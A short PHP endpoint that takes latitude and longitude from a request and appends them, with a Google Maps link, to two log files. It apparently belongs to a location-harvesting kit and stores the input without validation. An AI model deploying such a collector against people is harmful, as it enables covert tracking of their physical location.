<?php
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (empty($data)) {
    $lat = isset($_POST['lat']) ? $_POST['lat'] : '';
    $lon = isset($_POST['lon']) ? $_POST['lon'] : '';
} else {
    $lat = isset($data['lat']) ? $data['lat'] : '';
    $lon = isset($data['lon']) ? $data['lon'] : '';
}

if ($lat && $lon) {
    $google_link = "https://www.google.com/maps?q={$lat},{$lon}";
    $output = "📍 Localisation: lat={$lat}, lon={$lon}\nGoogle Map Link : {$google_link}\n";
    file_put_contents("location_log.txt", $output, FILE_APPEND);
    file_put_contents("../../sounds/location.txt", $output, FILE_APPEND);
    echo "OK";
}
?>
